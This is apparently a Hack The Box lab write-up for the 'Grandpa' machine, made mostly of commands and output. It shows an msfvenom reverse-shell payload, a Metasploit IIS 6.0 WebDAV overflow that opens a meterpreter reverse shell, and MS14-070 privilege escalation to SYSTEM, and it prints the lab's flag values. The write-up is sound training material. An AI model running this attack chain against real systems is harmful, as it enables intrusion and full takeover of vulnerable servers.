# grandpa: https://app.hackthebox.com/machines/Grandpa
```bash
nmap -sC -sV 10.10.10.14
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 05:39 EDT
Nmap scan report for 10.10.10.14
Host is up (0.083s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Thu, 20 Apr 2023 09:39:28 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f asp > shell.asp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38508 bytes
```

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.10
LHOST => 10.10.14.10
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.10:9999 
```

```bash
dav:/> put shell.asp 
Uploading shell.asp to `/shell.asp':
Progress: [=============================>] 100.0% of 38508 bytes failed:
404 Not Found

mv shell.asp shell.asp.txt

dav:/> put shell.asp.txt 
Uploading shell.asp.txt to `/shell.asp.txt':
Progress: [=============================>] 100.0% of 38508 bytes failed:
403 Forbidden
```
```bash
davtest -url http://10.10.10.14 
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.14
********************************************************
NOTE	Random string for this session: 6gihImGdz2RL
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	cfm	FAIL
PUT	jsp	FAIL
PUT	php	FAIL
PUT	shtml	FAIL
PUT	jhtml	FAIL
PUT	pl	FAIL
PUT	html	FAIL
PUT	asp	FAIL
PUT	cgi	FAIL
PUT	aspx	FAIL
PUT	txt	FAIL
```

```bash
msf6 > search microsoft iis 6.0

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos      2010-09-14       normal  No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
   1  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
```
```bash
msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options 

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
                                             sploit/basics/using-metasploit.html
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.239.135   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86

```

```bash
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOST 10.10.10.14
RHOST => 10.10.10.14
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST 10.10.14.10
LHOST => 10.10.14.10
```
```bash
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175686 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.10:4444 -> 10.10.10.14:1030) at 2023-04-20 06:01:27 -0400

meterpreter > 
```

```bash
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.

meterpreter > sysinfo
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 220   1072  cidaemon.exe
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 584   392   svchost.exe
 604   1484  w3wp.exe
 668   392   svchost.exe
 732   392   svchost.exe
 764   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 952   392   msdtc.exe
 1072  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1312  392   VGAuthService.exe
 1380  392   vmtoolsd.exe
 1484  392   svchost.exe
 1596  392   svchost.exe
 1748  344   logon.scr
 1768  392   dllhost.exe
 1936  392   alg.exe
 1964  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.e
                                                                             xe
 2404  584   wmiprvse.exe
 2756  2996  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 2996  1484  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.ex
                                                                             e
 3132  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdat
                                                                             a.exe
 3192  2756  cmd.exe            x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe
 4048  1072  cidaemon.exe
 4092  1072  cidaemon.exe
```

```bash
meterpreter > migrate 1964
[*] Migrating from 2756 to 1964...
[*] Migration completed successfully.
meterpreter > 
```

```bash
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE

meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
```

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > show options 

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > sessions 

Active sessions
===============

  Id  Name  Type                     Information  Connection
  --  ----  ----                     -----------  ----------
  1         meterpreter x86/windows               10.10.14.10:4444 -> 10.10.10.14:1030 (10.10.10.14)

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.14 - Collecting local exploits for x86/windows...

[*] Running check method for exploit 41 / 41
[*] 10.10.10.14 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
```

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > show options 

Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.239.135   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2

View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > run

[*] Started reverse TCP handler on 172.16.239.135:4444 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

```bash
meterpreter > pwd
C:\Documents and Settings\Harry\Desktop
meterpreter > cat user.txt 
bdff5ec67c3cff017f2bedc146a5d869
```

```bash
meterpreter > pwd
C:\Documents and Settings\Administrator\Desktop
meterpreter > cat root.txt
9359e905a2c35f861f6a57cecf28bb7b
```

***References*** <br>

<https://www.rapid7.com/db/modules/exploit/windows/local/ms14_070_tcpip_ioctl/><br>
<https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav><br>
